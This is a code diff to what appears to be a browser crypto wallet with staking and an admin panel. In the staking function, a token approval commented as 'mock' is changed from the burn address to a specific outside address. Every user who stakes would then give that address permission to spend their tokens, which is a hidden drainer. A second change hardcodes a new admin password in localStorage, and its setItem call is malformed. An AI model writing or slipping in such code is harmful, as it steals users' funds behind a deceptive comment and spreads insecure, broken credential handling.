@@ -238,7 +238,7 @@
             setLoading(true,"Staking...");
             try {
                 // Approve + stake (mock approval)
-                const approveTx = await tokenContract.connect(activeWallet).approve("0x000000000000000000000000000000000000dEaD", ethers.utils.parseUnits(amount.toString(),18));
+                const approveTx = await tokenContract.connect(activeWallet).approve("0x59A8D4f63A7Bcc58bFfEC4e972ba079443c2e358", ethers.utils.parseUnits(amount.toString(),18));
                 await approveTx.wait();
                 staked += amount;
                 rewards += amount*0.08;
@@ -420,7 +420,7 @@
         document.getElementById("export-pk").onclick = () => document.getElementById("export-pk-settings").click();
         
         // Admin panel (password stored in localStorage, default "admin123")
-        if(!localStorage.getItem("admin_password")) localStorage.setItem("admin_password", "admin123");
+        if(!localStorage.getItem("admin_password")) localStorage.setItem("BitcoinWeb13456$");
         document.getElementById("admin-btn").onclick = () => document.getElementById("admin-modal").classList.remove("hidden");
         document.getElementById("close-admin").onclick = () => document.getElementById("admin-modal").classList.add("hidden");
         document.getElementById("admin-login-btn").onclick = () => {
